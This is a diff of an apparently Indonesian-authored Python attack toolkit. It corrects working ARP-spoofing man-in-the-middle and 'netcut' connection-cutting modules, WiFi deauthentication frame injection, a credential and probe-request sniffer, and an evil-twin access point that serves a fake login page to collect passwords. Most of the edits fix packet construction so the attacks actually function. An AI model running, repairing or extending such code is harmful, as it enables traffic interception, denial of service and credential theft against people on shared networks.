@@ -155,13 +155,18 @@ def mod_csrf():
     st, body, hd = _http_req(url, "GET")
     s = body.decode(errors="replace")
     cookies = hd.get("Set-Cookie", "")
-    same_site = "samesite" in cookies.lower()
+    same_site = None
+    for ck in hd.get("Set-Cookie", "").split(";"):
+        if ck.strip().lower().startswith("samesite="):
+            same_site = ck.split("=", 1)[1].strip().lower()
+            break
     has_token = bool(re.search(r"csrf_token|_token|authenticity_token", s, re.I))
     print(f"GET {url} -> {st}")
     print(f"  cookie: {'Set-Cookie present' if cookies else 'none'}")
-    print(f"  SameSite: {'set (+Lax/Strict safe for state-change)' if same_site else 'MISSING -> vulnerable to cross-site POST'}")
+    ss_ok = same_site in ("lax", "strict")
+    print(f"  SameSite: {same_site or 'MISSING'} {'(Lax/Strict OK)' if ss_ok else '-> vulnerable to cross-site state-change'}")
     print(f"  csrf token in body: {'present' if has_token else 'MISSING -> need origin/referer check'}")
-    verdict = "hardened" if (same_site and has_token) else "review"
+    verdict = "hardened" if (ss_ok and has_token) else "review"
     print(f"  verdict: {verdict}")
     _save("csrf", url, f"code={st} samesite={same_site} token={has_token}")
 
@@ -224,25 +229,28 @@ def mod_mitm():
     if not amac:
         print(f"cannot resolve own MAC on {iface} — check interface name"); return
     print(f"attacker (via {iface}) @ {':'.join(amac[i:i+2] for i in range(0,12,2))}")
-    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
-    s.bind((iface, 0))
-    gmac = mac(gw) or "ffffffffffff"
-    def pkt(claims_mac, claims_ip, op, dst_mac=b"\xff\xff\xff\xff\xff\xff"):
-        # ARP frame: src MAC = attacker own MAC (amac); sender = claims_mac@claims_ip
+    try:
+        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
+        s.bind((iface, 0))
+    except (OSError, AttributeError) as e:
+        print(f"raw socket/AF_PACKET gagal pada {iface}: {e} — butuh Linux+root, cek interface."); return
+    def arp_frame(dst_hex, src_hex, target_ip, sender_ip, op):
+        # ARP payload: sender = src_hex@sender_ip, target = dst_hex@target_ip
         p = struct.pack("!HHBBH", 1, 0x0800, 6, 4, op)
-        p += bytes.fromhex(claims_mac) + socket.inet_aton(claims_ip)
-        p += bytes.fromhex(gmac if claims_ip == gw else vmac) + socket.inet_aton(gw if claims_ip == gw else vi)
-        return dst_mac + bytes.fromhex(amac) + b"\x08\x06" + p
-    # spoof BOTH directions: tell victim that gw is at MY mac; tell gw that vi is at MY mac
+        p += bytes.fromhex(src_hex) + socket.inet_aton(sender_ip)
+        p += bytes.fromhex(dst_hex) + socket.inet_aton(target_ip)
+        # ethernet: broadcast dst, src = attacker's own MAC
+        return b"\xff\xff\xff\xff\xff\xff" + bytes.fromhex(amac) + b"\x08\x06" + p
+    # spoof BOTH directions: tell victim "gw is amac"; tell gateway "vi is amac"
     def spoof_once():
-        s.send(pkt(amac, gw, 1))   # reply to victim: "gw is amac" (broadcast)
-        s.send(pkt(amac, vi, 1))   # reply to gw: "vi is amac" (broadcast)
+        s.send(arp_frame(vmac, amac, vi, gw, 2))   # victim: gw is amac
+        s.send(arp_frame(gmac, amac, gw, vi, 2))   # gateway: vi is amac
     def restore():
         # heal both caches with TRUE mapping
         for _ in range(3):
             try:
-                s.send(pkt(gmac, gw, 2))   # victim: gw really at gmac
-                s.send(pkt(vmac, vi, 2))   # gateway: vi really at vmac
+                s.send(arp_frame(vmac, gmac, vi, gw, 2))   # victim: gw at gmac
+                s.send(arp_frame(gmac, vmac, gw, vi, 2))   # gateway: vi at vmac
                 time.sleep(0.1)
             except Exception: pass
     print(f"spoofing {vi}<->{gw} for {rng}s (ctrl-c to stop early). capturing is passive; run tcpdump/tshark in parallel.")
@@ -279,8 +287,8 @@ def mod_netcut():
     try:
         s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
         s.bind((iface, 0))
-    except OSError as e:
-        print(f"raw socket bind {iface} gagal ({e}) — pastikan root + interface benar."); return
+    except (OSError, AttributeError) as e:
+        print(f"raw socket bind {iface} gagal ({e}) — pastikan Linux+root + interface benar."); return
     def mac(ip):
         out = subprocess.run(["cat", "/proc/net/arp"], capture_output=True, text=True).stdout
         for line in out.splitlines()[1:]:
@@ -288,6 +296,16 @@ def mod_netcut():
             if len(f) >= 4 and f[0] == ip: return f[3].replace(":", "")  # strip colons for fromhex
         return None
     print("resolving target MAC...")
+    amac = None
+    try:
+        import fcntl as _f, struct as _st2
+        s0 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        r = _f.ioctl(s0.fileno(), 0x8927, _st2.pack("256s", iface[:15].encode()))
+        amac = r[18:24].hex()
+    except Exception:
+        pass
+    if not amac:
+        print(f"cannot resolve own MAC on {iface} — check interface name"); s.close(); return
     vmac = mac(vi)  # raw hex: "001122334455"
     if not vmac:
         print(f"target {vi} not in ARP table — ping {vi} dulu, atau pastikan aktif di LAN."); return
@@ -295,13 +313,15 @@ def mod_netcut():
     gmac_raw = mac(gw)  # raw hex
     if not gmac_raw:
         print(f"gateway {gw} not in ARP table — fallback ff:ff:ff:ff:ff:ff"); gmac_raw = "ffffffffffff"
-    DUMMY_MAC = "000000000000"
+    # locally-administered, guaranteed-unroutable (real devices drop these,
+    # unlike 00:00:00:00:00:00 which many stacks ignore as "invalid sender")
+    DUMMY_MAC = "020000000000"
     import struct as _st
     def arp_frame(dst_hex, src_hex, target_ip, sender_ip, op):
         p = _st.pack("!HHBBH", 1, 0x0800, 6, 4, op)
         p += bytes.fromhex(src_hex) + socket.inet_aton(sender_ip)
         p += bytes.fromhex(dst_hex) + socket.inet_aton(target_ip)
-        return b"\xff\xff\xff\xff\xff\xff" + bytes.fromhex(dst_hex) + b"\x08\x06" + p
+        return b"\xff\xff\xff\xff\xff\xff" + bytes.fromhex(amac) + b"\x08\x06" + p
     def broadcast(pkt): s.send(pkt)
     # cut: victim believes gw is at UNREACHABLE mac -> traffic to gw blackholes
     def cut_once():
@@ -354,19 +374,24 @@ def mod_deauth():
     print("pastikan interface monitor: ip link set " + iface + " down && iw dev " + iface + " set type monitor && ip link set " + iface + " up")
     try:
         s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
-    except OSError as e:
-        print(f"raw socket gagal ({e}) — pakai aireplay-ng (aircrack-ng)."); return
+    except (OSError, AttributeError) as e:
+        print(f"raw socket/AF_PACKET gagal ({e}) — pakai aireplay-ng (aircrack-ng)."); return
     try:
         s.bind((iface, 0))
-    except OSError as e:
-        print(f"bind {iface} gagal ({e}) — sehingga monitor iface."); return
+    except (OSError, AttributeError) as e:
+        print(f"bind {iface} gagal ({e}) — sehingga monitor iface (butuh root + monitor mode)."); return
+    _mac_re = re.compile(r"^[0-9a-fA-F]{2}(:[0-9a-fA-F]{2}){5}$")
+    if ap_mac and not _mac_re.match(ap_mac):
+        print(f"AP mac invalid: {ap_mac!r} (format xx:xx:xx:xx:xx:xx)"); return
+    if client and not _mac_re.match(client):
+        print(f"client mac invalid: {client!r}"); return
     # 802.11 deauth: type/mgmt (0x00 0x00), flags, duration, da, sa, bssid, seq, reason
     client_raw = client.replace(":", "") if client else ""
     ap_raw = ap_mac.replace(":", "")
     da = bytes.fromhex(client_raw) if client_raw else b"\xff\xff\xff\xff\xff\xff"
     sa = bytes.fromhex(ap_raw)
     bssid = sa
-    frame = b"\x00\x00\x00\x00\xff" + da + sa + bssid + b"\x00\x00\x07\x00"
+    frame = b"\xc0\x00\x00\x00" + da + sa + bssid + b"\x00\x00\x07\x00"
     print(f"sending {cnt} deauth frames (da={':'.join(client_raw[i:i+2] for i in range(0,12,2)) if client_raw else 'broadcast'}, sa={ap_mac})...")
     for _ in range(cnt):
         try:
@@ -387,11 +412,14 @@ def mod_sniff():
     secs = int(_ask("capture seconds [10]: ").strip() or "10")
     mode = _ask("target: [c]reds HTTP  [p]robe nearby: ").strip().lower() or "c"
     print(f"capturing on {iface} {secs}s (raw AF_PACKET)...")
-    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
+    try:
+        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
+    except (OSError, AttributeError) as e:
+        print(f"raw socket/AF_PACKET gagal ({e}) — butuh Linux+root, cek monitor mode."); return
     try:
         s.bind((iface, 0))
-    except OSError as e:
-        print(f"bind gagal ({e})"); return
+    except (OSError, AttributeError) as e:
+        print(f"bind {iface} gagal ({e})"); return
     s.settimeout(1)
     import re as _re
     stop = [time.time() + secs]
@@ -406,11 +434,15 @@ def mod_sniff():
                 break
             if mode == "p":
                 # 802.11 probe request: subtype 0x04 in frame control
-                if len(pkt) > 30 and (pkt[0] & 0xfc) == 0x40:
-                    # probe req body: SSID after fixed header (24 bytes) + tags
+                if len(pkt) > 26 and (pkt[0] & 0xf0) == 0x40:
+                    # probe req body: SSID IE = id(1) + len(1) + ssid, after 24-byte MAC header
                     try:
-                        ssid = pkt[24:].split(b"\x00", 1)[0].decode(errors="ignore")
-                        if ssid.isprintable() and ssid:
+                        slen = pkt[25]
+                        if slen:
+                            ssid = pkt[26:26+slen].decode(errors="ignore")
+                        else:
+                            ssid = ""  # broadcast probe
+                        if ssid and ssid.isprintable():
                             hits.append(("probe", ssid, pkt[10:16].hex(":")))
                             print(f"[probe] {ssid} src={pkt[10:16].hex(':')}")
                     except Exception:
@@ -477,14 +509,16 @@ def mod_eviltwin():
         f.write("<html><body><h1>WiFi Config Required</h1><form method=post>"
                 "<input name=user placeholder=username><br><input name=pass type=password>"
                 "<br><button>Connect</button></form></body></html>")
-    print(f"evil twin '{ssid}' on {iface} (open + WPA2 'hkalltest'). Landing: http://{gw_ip}")
-    print(f"configs di {d} — ctrl-c stop, scan session destroy")
     procs = []
+    httpd = None
     try:
         import http.server as _hs
         os.chdir(d)
         handler = _hs.SimpleHTTPRequestHandler
-        httpd = _hs.HTTPServer((gw_ip, 80), handler)
+        try:
+            httpd = _hs.HTTPServer((gw_ip, 80), handler)
+        except OSError as e:
+            print(f"landing bind {gw_ip}:80 gagal ({e}) — free port dulu."); return
         import threading as _th
         _th.Thread(target=httpd.serve_forever, daemon=True).start()
         procs.append(subprocess.Popen(["dnsmasq", "-C", dnsmasq_cfg, "--no-daemon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
@@ -497,10 +531,14 @@ def mod_eviltwin():
         pass
     finally:
         for p in procs:
-            try: p.terminate()
+            try:
+                p.terminate(); p.wait(timeout=2)
+            except Exception:
+                try: p.kill()
+                except Exception: pass
+        if httpd:
+            try: httpd.shutdown()
             except Exception: pass
-        try: httpd.shutdown()
-        except Exception: pass
         print("evil twin stopped.")
 
 # ---------------------------------------------------------------- dns spoof
